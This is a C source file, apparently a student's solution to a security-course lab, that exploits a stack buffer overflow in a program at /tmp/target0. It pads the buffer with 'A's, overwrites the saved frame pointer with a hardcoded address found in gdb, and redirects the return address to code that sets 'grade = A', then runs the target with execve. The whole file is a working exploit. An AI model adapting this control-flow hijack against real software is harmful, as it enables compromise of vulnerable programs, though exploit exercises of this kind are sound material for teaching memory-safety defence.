#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
  char over[34]; // Argument for target0
  int i;
	
  // Filling buffer with A's ( buf[25] )
  for (i = 0; i < 25; i++){
	over[i] = 'A';
  } 

  // EBP of main where argslist, locals etc. are stored.
  // Its important, this is right to ensure seg faults dont happen.
  // This also ensures we aren't attempting to access invalid/random memory
  // Also, ensure we don't leave any errors behind.
  // Most importantly, it ensures argc = 2 and argv=buf which is what
  // normal operation is like.  
 
  // (Found - gdb: break main , info frame , saved registers: ebp )
  over[25] = '\x78';
  over[26] = '\xfe';
  over[27] = '\xff';
  over[28] = '\xbf';

  // Address for 'grade = A' in main. (Found - gdb: disassemble main)
  over[29] = '\x1d';
  over[30] = '\x85';
  over[31] = '\x04';
  over[32] = '\x08';

  // Terminating the char string with a NULL character ( may not be needed ).	
  over[33] = '\0';

	args[0] = TARGET; args[1] = over; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
